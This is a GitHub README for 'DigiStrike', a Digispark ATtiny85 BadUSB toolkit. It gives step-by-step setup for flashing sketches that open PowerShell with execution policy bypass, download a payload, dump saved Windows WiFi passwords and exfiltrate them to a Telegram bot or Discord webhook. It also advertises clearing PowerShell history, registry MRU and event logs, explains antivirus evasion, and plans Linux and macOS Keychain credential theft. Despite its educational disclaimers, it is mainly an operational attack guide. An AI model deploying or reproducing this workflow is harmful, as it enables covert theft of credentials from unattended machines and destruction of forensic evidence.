<!--
  SEO TITLE: Digispark HID Toolkit | ATtiny85 USB HID Automation Framework
  DESCRIPTION: Open-source Digispark ATtiny85 toolkit for USB HID automation, keyboard emulation,
  device scripting and cybersecurity education. Supports Telegram and Discord exfiltration.
  KEYWORDS: Digispark, ATtiny85, USB HID, Keyboard Emulation, USB Automation, Arduino,
  Embedded Systems, Device Scripting, Cybersecurity Education, USB Keyboard, HID Automation,
  Digispark Projects, ATtiny85 Projects, Arduino HID, BadUSB, WiFi credential dumper,
  penetration testing, red team, PowerShell payload, Discord webhook, Telegram bot.
-->

<div align="center">

<img src="images/banner.png" alt="Digispark HID Toolkit" width="800" />

# Digispark HID Toolkit

### ATtiny85 USB HID Automation Framework

[![Stars](https://img.shields.io/github/stars/Esther7171/DigiStrike?style=for-the-badge&color=yellow)](https://github.com/Esther7171/DigiStrike/stargazers)
[![Forks](https://img.shields.io/github/forks/Esther7171/DigiStrike?style=for-the-badge&color=blue)](https://github.com/Esther7171/DigiStrike/network/members)
[![License](https://img.shields.io/badge/License-BSD%203--Clause-blue?style=for-the-badge)](LICENSE)
[![Issues](https://img.shields.io/github/issues/Esther7171/DigiStrike?style=for-the-badge&color=red)](https://github.com/Esther7171/DigiStrike/issues)
[![PRs](https://img.shields.io/github/issues-pr/Esther7171/DigiStrike?style=for-the-badge&color=green)](https://github.com/Esther7171/DigiStrike/pulls)
[![Integration](https://img.shields.io/badge/Integration-Telegram%20%7C%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://github.com/Esther7171/DigiStrike)

**Open-source Digispark ATtiny85 toolkit for USB HID automation, keyboard emulation, device scripting and cybersecurity education.**

[Getting Started](#getting-started) &nbsp;|&nbsp; [Telegram Setup](#telegram-integration) &nbsp;|&nbsp; [Discord Setup](#discord-integration) &nbsp;|&nbsp; [Docs](docs/) &nbsp;|&nbsp; [Examples](examples/)

</div>

---

## What is Digispark HID Toolkit?

The Digispark HID Toolkit is an open-source framework built on the **Digispark ATtiny85** microcontroller for demonstrating **USB HID automation**, **keyboard emulation** and **cybersecurity education** concepts.

When plugged into a computer, the Digispark ATtiny85 registers as a **USB keyboard device**. The host operating system trusts it unconditionally — no drivers needed, no antivirus prompts, no USB storage warnings. The device then executes pre-programmed keystrokes at machine speed, automating tasks that would take a human seconds to complete.

This toolkit ships two ready-to-use demonstration payloads focused on **WiFi credential awareness** — showing audiences at college exhibitions and CTF events exactly how fast data can be read from an unattended machine and exfiltrated to **Telegram** or **Discord** in under 25 seconds.

> **This project is for educational use on devices you own or have explicit permission to test.**
> See [SECURITY.md](SECURITY.md) and [Disclaimer](#disclaimer) for full terms.

---

## Table of Contents

- [Features](#features)
- [Hardware Requirements](#hardware-requirements)
- [Supported Platforms](#supported-platforms)
- [Installation](#installation)
- [Getting Started](#getting-started)
- [Telegram Integration](#telegram-integration)
- [Discord Integration](#discord-integration)
- [Project Structure](#project-structure)
- [Examples](#examples)
- [Screenshots](#screenshots)
- [Use Cases](#use-cases)
- [FAQ](#faq)
- [Roadmap](#roadmap)
- [Contributing](#contributing)
- [Security Policy](#security-policy)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Features

- USB HID keyboard emulation via Digispark ATtiny85
- WiFi credential exfiltration demo for security awareness presentations
- Two exfiltration channels: Telegram bot and Discord webhook
- Fully automated — plug in and done in under 25 seconds
- Zero-trace design: clears temp files, PowerShell history, registry MRU and Windows Event Logs
- Credentials typed as live keystrokes — nothing stored in script files or on GitHub
- Random temp filename on every run
- Beginner-friendly examples for learning HID automation
- Detailed setup docs for Telegram and Discord integration
- GitHub Actions for Markdown and PowerShell linting

---

## Hardware Requirements

| Item | Details |
|------|---------|
| Digispark ATtiny85 | Main board. USB-A version recommended. |
| USB-A port | On the target machine |
| Computer for flashing | Windows, Linux or macOS with Arduino IDE |

**Where to buy:**
Amazon India, Robu.in, AliExpress or any local electronics store.
Search: `Digispark ATtiny85`

Cost: **under ₹300 (~$3 USD)** — the most affordable USB HID tool available.

See [docs/hardware.md](docs/hardware.md) for full hardware details, driver installation and board specifications.

---

## Supported Platforms

| Platform | HID Automation | WiFi Payload |
|----------|:--------------:|:------------:|
| Windows 10 | Yes | Yes |
| Windows 11 | Yes | Yes |
| Linux | Yes | No (payload targets Windows) |
| macOS | Yes | No (payload targets Windows) |

The Digispark ATtiny85 itself works on any OS. The WiFi credential demonstration payload targets Windows specifically because it uses `netsh wlan` and PowerShell.

---

## Installation

### Step 1: Install Arduino IDE

Download Arduino IDE 1.8.x from [arduino.cc/en/software](https://www.arduino.cc/en/software).

> Use 1.8.x. Version 2.x has known timing issues with the Digispark upload process.

---

### Step 2: Add the Digispark Board Package

1. Open Arduino IDE.
2. Go to `File` > `Preferences`.
3. Paste this URL into the *Additional Board Manager URLs* field:
   ```
   http://digistump.com/package_digistump_index.json
   ```
4. Click OK.
5. Go to `Tools` > `Board` > `Board Manager`.
6. Search **Digistump AVR Boards** and click **Install**.

---

### Step 3: Select the Board

```
Tools > Board > Digistump AVR Boards > Digispark (Default - 16.5mhz)
```

> Do not select a COM port. Digispark handles enumeration during upload.

---

### Step 4: Verify the DigiKeyboard Library

The `DigiKeyboard.h` library ships with the Digistump board package. No separate installation is needed.

If Arduino IDE reports it as missing:
```
Sketch > Include Library > Manage Libraries > search "DigiKeyboard" > Install
```

---

## Getting Started

Pick the exfiltration channel you want to use, configure the sketch, and flash it.

| Channel | Sketch | Payload script |
|---------|--------|---------------|
| Telegram | [digispark/telegram/r00t_b0t.ino](digispark/telegram/r00t_b0t.ino) | [scripts/void.ps1](scripts/void.ps1) |
| Discord | [digispark/discord/r00t_b0t.ino](digispark/discord/r00t_b0t.ino) | [scripts/null.ps1](scripts/null.ps1) |

Both payload scripts are hosted publicly on GitHub with zero secrets. Credentials are injected at runtime as keystrokes.

---

### Flashing the Digispark

1. Open your chosen `.ino` file in Arduino IDE.
2. Replace the placeholder values (token, chat ID or webhook URL — see sections below).
3. Click **Upload**.
4. Wait until Arduino IDE shows:
   ```
   Running Digispark Uploader...
   Plug in device now... (will timeout in 60 seconds)
   ```
5. **Only then** plug in the Digispark.
6. Wait for:
   ```
   >> Micronucleus done. Thank you!
   ```

The device is ready. Plug it into any target Windows machine.

---

### Execution Timeline

Every delay is hardcoded in the `.ino` file and is fully adjustable.

| Phase | Action | Default time |
|-------|--------|-------------|
| HID Stabilize | OS enumerates the device | 3.0s |
| Win+R | Open Run dialog | 1.0s |
| PowerShell Open | Launch PS with `-ep bypass` | 4.0s |
| Credential Injection | Type token or webhook as env var | 0.4s |
| Payload Execution | Download and run script, exfiltrate | 15.0s |
| Clean Exit | Close PowerShell | 0.5s |
| **Total** | | **~23.9s** |

Increase delays on slow machines. Cut them on fast ones.

---

## Telegram Integration

This section shows you exactly how to set up a Telegram bot from scratch and connect it to the Digispark sketch. For the full detailed guide see [docs/telegram-setup.md](docs/telegram-setup.md).

### Step 1: Create a Bot with BotFather

1. Open Telegram on your phone or desktop.
2. In the search bar, type `@BotFather` and open the **verified account** (blue tick).
3. Tap **Start** or send `/start`.
4. Send `/newbot`.

BotFather asks two questions:

**Display name** — any name, can have spaces. Example: `My Data Bot`

**Username** — must end in `bot`, no spaces. Example: `my_data_r00t_bot`
If the username is taken, BotFather will prompt you to pick another.

Once done, BotFather replies with your **API token**:
```
Use this token to access the HTTP API:

1234567890:ABCDefghIJKLmnoPQRsTUVwxyz1234567890
```

Copy the full token including the numbers before the colon. Store it securely.

---

### Step 2: Get Your Chat ID

**Private chat (just you and the bot):**

1. Search your bot username in Telegram and open the chat.
2. Send any message to the bot (e.g., `hi`).
3. Open this URL in a browser, replacing `YOUR_TOKEN`:
   ```
   https://api.telegram.org/botYOUR_TOKEN/getUpdates
   ```
4. In the JSON response, look for:
   ```json
   "chat": {
     "id": 987654321,
     "type": "private"
   }
   ```
5. Copy the number next to `"id"`. That is your chat ID.

**Group chat:**

1. Create a Telegram group and add your bot as a member.
2. Send any message in the group.
3. Visit the same `getUpdates` URL above.
4. The group chat ID starts with a minus sign:
   ```json
   "chat": {
     "id": -100987654321,
     "type": "supergroup"
   }
   ```
5. Copy the full number including the minus sign.

---

### Step 3: Configure the Sketch

Open `digispark/telegram/r00t_b0t.ino` in Arduino IDE.

Find these two lines:
```cpp
DigiKeyboard.print("$env:TK='PASTE_TOKEN_HERE'");
DigiKeyboard.print("$env:CI='PASTE_CHAT_ID_HERE'");
```

Replace the placeholders:

| Placeholder | What to put |
|-------------|------------|
| `PASTE_TOKEN_HERE` | Your full bot token, e.g. `1234567890:ABCDef...` |
| `PASTE_CHAT_ID_HERE` | Your chat ID, e.g. `987654321` or `-100987654321` |

The values are typed as live keystrokes. They never reach disk, the script file or GitHub.

Flash the board as described in [Getting Started](#getting-started). In about 24 seconds a `.txt` file with all saved WiFi credentials arrives in your Telegram chat.

---

## Discord Integration

This section shows you how to create a Discord webhook and connect it to the sketch. For the full guide see [docs/discord-setup.md](docs/discord-setup.md).

### Step 1: Create a Discord Server (skip if you have one)

1. Open Discord.
2. Click the **+** icon at the bottom of the left sidebar.
3. Click **Create My Own** and follow the prompts.
4. Name it anything. Example: `Lab Alerts`

---

### Step 2: Create a Webhook

1. Right-click the channel where you want alerts and click **Edit Channel**.
2. In the left sidebar of channel settings, click **Integrations**.
3. Click **Webhooks**.
4. Click **New Webhook**.
5. Give the webhook a name. Example: `r00t_b0t`
6. Confirm the channel is correct using the **Channel** dropdown.
7. Click **Copy Webhook URL**.

The URL looks like this:
```
https://discord.com/api/webhooks/1234567890123456789/ABCDefghIJKLmnoPQRsTUVwxyz-LONGTOKEN
```

Keep this URL private. Anyone with it can post to your channel.

8. Click **Save Changes**.

---

### Step 3: Pre-test the Webhook (optional)

Before flashing, verify the URL works from PowerShell on your own machine:

```powershell
$wh = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
$body = ConvertTo-Json @{ content = "Test from Digispark HID Toolkit" }
Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
```

If the message appears in Discord, the webhook is working.

---

### Step 4: Configure the Sketch

Open `digispark/discord/r00t_b0t.ino` in Arduino IDE.

Find this line:
```cpp
DigiKeyboard.print("$env:WH='PASTE_WEBHOOK_URL_HERE'");
```

Replace `PASTE_WEBHOOK_URL_HERE` with your full webhook URL:
```cpp
DigiKeyboard.print("$env:WH='https://discord.com/api/webhooks/1234.../ABCDef...'");
```

Flash the board. In about 24 seconds a formatted message appears in your Discord channel:

```
[r00t_b0t] Incoming Data
================================
PC      : DESKTOP-XXXXXX
User    : username
Domain  : WORKGROUP
================================
WiFi Passwords
--------------------------------
Network  : HomeNetwork
Password : mypassword123
--------------------------------
```

---

## Project Structure

```
DigiStrike/
├── README.md                          This file
├── LICENSE                            BSD 3-Clause
├── CONTRIBUTING.md                    How to contribute
├── SECURITY.md                        Security and responsible use policy
├── CHANGELOG.md                       Version history
├── CODE_OF_CONDUCT.md                 Community standards
│
├── digispark/
│   ├── telegram/
│   │   └── r00t_b0t.ino              Telegram sketch - flash to ATtiny85
│   └── discord/
│       └── r00t_b0t.ino              Discord sketch - flash to ATtiny85
│
├── scripts/
│   ├── void.ps1                       Telegram PowerShell payload
│   └── null.ps1                       Discord PowerShell payload
│
├── docs/
│   ├── telegram-setup.md              Full Telegram integration guide
│   ├── discord-setup.md               Full Discord integration guide
│   ├── hardware.md                    Hardware specs, drivers and sourcing
│   └── troubleshooting.md             Common issues and fixes
│
├── examples/
│   ├── README.md                      Examples overview
│   ├── hello-world/
│   │   └── hello_world.ino            Types "Hello World" — beginner starter
│   ├── open-notepad/
│   │   └── open_notepad.ino           Opens Notepad and types a message
│   └── keyboard-test/
│       └── keyboard_test.ino          Tests full keyboard character output
│
├── images/                            Banner and screenshots (add your own)
├── assets/                            Additional assets
│
└── .github/
    └── workflows/
        ├── lint.yml                   Markdown and PowerShell lint on push
        └── release.yml                Auto-release on version tag push
```

---

## Examples

The [examples/](examples/) directory contains beginner-friendly Digispark sketches for learning USB HID automation before building more advanced payloads.

| Example | Description |
|---------|-------------|
| [hello-world](examples/hello-world/hello_world.ino) | Types a string into any focused text field |
| [open-notepad](examples/open-notepad/open_notepad.ino) | Opens Notepad on Windows and types a message |
| [keyboard-test](examples/keyboard-test/keyboard_test.ino) | Types all alphanumeric characters to verify key mapping |

Basic HID sketch structure:
```cpp
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000);           // Wait for OS to enumerate the HID device
  DigiKeyboard.print("Hello World");  // Type text
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

---

## Screenshots

> Add your own screenshots to the `images/` folder and update these paths.

| | |
|-|-|
| ![Banner](images/banner.png) | ![Demo](images/demo.gif) |
| *Project banner* | *Live demo* |
| ![Dashboard](images/dashboard.png) | |
| *Telegram output* | |

---

## Use Cases

**College and university exhibitions**
Demonstrate to an audience how an unattended computer can have its saved WiFi passwords read and exfiltrated in under 25 seconds using a device smaller than a thumb drive that costs under ₹300.

**Cybersecurity awareness workshops**
Show employees or students what a USB HID attack looks like in practice. Use on demonstration machines with no real credentials.

**CTF competitions**
The Digispark ATtiny85 is a standard tool in CTF hardware challenges. These sketches serve as a working starting point.

**Arduino and embedded systems learning**
The examples directory provides a gentle introduction to HID keyboard emulation on ATtiny85 without any sensitive payload logic.

**Red team demonstrations**
Authorized penetration testing engagements where the client wants a live BadUSB attack demonstration included in the scope.

---

## FAQ

**Do I need to install any drivers on the target machine?**
No. The Digispark registers as a standard HID keyboard. Windows, Linux and macOS all support HID natively.

**Does this trigger antivirus?**
The Digispark itself is a keyboard — antiviruses do not block keyboard input. The PowerShell script downloads a file from GitHub over HTTPS, which most network security tools allow.

**Can I change the exfiltration target at any time?**
Yes. Re-flash the Digispark with an updated token or webhook URL. The process takes about 30 seconds.

**What if the target machine does not have internet access?**
The payload will fail silently. The script cannot reach Telegram or Discord without outbound internet access.

**Is the bot token or webhook URL stored anywhere on the target machine?**
No. Both values are typed as keystrokes directly into PowerShell as environment variables. They exist only in RAM during execution and are never written to disk.

**Can I use a different exfiltration method?**
Yes. The payload scripts can be modified to support other services like Slack, SMTP email or a custom server. The Digispark sketch only needs to set the appropriate environment variable.

**Does this work on Windows 11?**
Yes. Tested and working.

**Can I use this on Linux or macOS?**
The Digispark will enumerate as a keyboard on any OS. The current payloads use `netsh wlan` and PowerShell which are Windows-specific. Linux and macOS payloads would need different scripting.

---

## Roadmap

- [ ] Linux payload for WiFi credential dumping (`nmcli`)
- [ ] macOS payload for Keychain credential access
- [ ] Slack webhook integration
- [ ] Custom HTTP POST exfiltration target
- [ ] Rubber Ducky script converter
- [ ] GUI configurator for generating sketches without editing code
- [ ] Payload delay auto-calibration sketch

Have a feature request? [Open an issue](https://github.com/Esther7171/DigiStrike/issues).

---

## Contributing

Contributions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request.

Short version:
1. Fork the repo
2. Create a branch: `git checkout -b feature/your-feature`
3. Make changes and test on hardware if possible
4. Open a pull request against `main`

Do not submit payloads designed for unauthorized access.

---

## Security Policy

Read the full policy in [SECURITY.md](SECURITY.md).

To report a security issue with this project, do not open a public issue. Contact the maintainer privately via the GitHub profile. We follow responsible disclosure.

---

## Recommended GitHub Topics

Add these topics to the repository via `Settings > Topics` on GitHub for better discoverability:

```
digispark  attiny85  usb-hid  hid  keyboard-emulation  usb-automation
arduino  embedded-systems  device-scripting  cybersecurity  security-research
windows  badusb  red-team  arduino-hid
```

---

## Disclaimer

This project is for educational use and authorized security research only.

- Use only on devices you own or have explicit written permission to test
- Suitable for college exhibitions, CTF labs and cybersecurity awareness workshops
- Unauthorized use violates the IT Act (India), CFAA (USA) and equivalent laws worldwide
- The author takes no responsibility for misuse or any consequences arising from it

---

## License

BSD 3-Clause License
Copyright (c) 2026 Esther7171

See [LICENSE](LICENSE) for the full text.

---

## Author

**Esther7171**

[![GitHub](https://img.shields.io/badge/GitHub-Esther7171-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171)
[![DeathEsther](https://img.shields.io/badge/Project-DeathEsther-8B0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Esther7171/DeathEsther)

---

<div align="center">

If this helped you understand USB HID attacks and cybersecurity fundamentals, drop a ⭐

</div>
